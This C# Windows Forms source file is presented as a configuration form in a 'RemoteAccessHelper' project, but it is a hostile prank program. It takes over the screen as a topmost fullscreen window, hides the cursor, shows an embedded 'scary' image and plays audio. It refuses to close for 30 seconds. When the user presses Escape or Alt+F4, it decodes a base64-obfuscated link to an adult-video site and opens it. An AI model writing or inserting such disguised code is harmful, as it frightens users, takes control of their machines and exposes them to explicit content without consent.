using System.Diagnostics;
using System.Media;
using System.Reflection;

namespace RemoteAccessHelper
{
    public partial class ConfigurationForm : Form
    {
        private System.Windows.Forms.Timer closeTimer;
        private SoundPlayer? soundPlayer;

        public ConfigurationForm()
        {
            InitializeComponent();
            SetupForm();
            LoadConfigImage();
            PlayConfigurationAudio();
            StartCloseTimer();
        }

        private void SetupForm()
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.ShowInTaskbar = false;
            Cursor.Hide();
            
            this.ControlBox = false;
            this.MinimizeBox = false;
            this.MaximizeBox = false;
        }
        
        private void LoadConfigImage()
        {
            try
            {
                string resourceName = "RemoteAccessHelper.configs.image.jpg"; 
                Assembly assembly = Assembly.GetExecutingAssembly();
                using (Stream? stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream != null)
                    {
                        stream.Position = 0; 
                        
                        Image scaryImage = Image.FromStream(stream);
                        
                        PictureBox pictureBox = new PictureBox
                        {
                            Image = scaryImage,
                            SizeMode = PictureBoxSizeMode.Zoom,
                            Dock = DockStyle.Fill
                        };

                        this.Controls.Add(pictureBox);
                    }
                }
            }
            catch (Exception ex)
            {
                // ignored
            }
        }
        
        private void PlayConfigurationAudio()
        {
            try
            {
                string resourceName = "RemoteAccessHelper.configs.config.wav"; 
                Assembly assembly = Assembly.GetExecutingAssembly();

                Stream? audioStream = assembly.GetManifestResourceStream(resourceName);
                if (audioStream != null)
                {
                    soundPlayer = new SoundPlayer(audioStream);
                    soundPlayer.Play();
                }
            }
            catch (Exception ex)
            {
                // ignored
            }
        }

        private void StartCloseTimer()
        {
            closeTimer = new System.Windows.Forms.Timer();
            closeTimer.Interval = 30000;
            closeTimer.Tick += CloseTimer_Tick;
            closeTimer.Start();
        }

        private void CloseTimer_Tick(object? sender, EventArgs e)
        {
            closeTimer.Stop();
            closeTimer.Dispose();
            
            soundPlayer?.Stop();
            soundPlayer?.Dispose();
            
            Cursor.Show();
            
            this.Close();
            Application.Exit();
        }
        
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason != CloseReason.ApplicationExitCall)
            {
                e.Cancel = true;
            }
            else
            {
                closeTimer?.Stop();
                closeTimer?.Dispose();
                soundPlayer?.Stop();
                soundPlayer?.Dispose();
                base.OnFormClosing(e);
            }
        }
        
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == Keys.Escape || keyData == Keys.F4 || 
                keyData == (Keys.F4 | Keys.Alt) || keyData == (Keys.F4 | Keys.Control))
            {
                string url = "aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20vdmlld192aWRlby5waHA/dmlld2tleT02NzNkYjRiMDE2ZDJl"; 

                byte[] decodedBytes = Convert.FromBase64String(url);
                
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = System.Text.Encoding.UTF8.GetString(decodedBytes),
                        UseShellExecute = true
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Не удалось открыть браузер: " + ex.Message);
                }
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }
    }
} 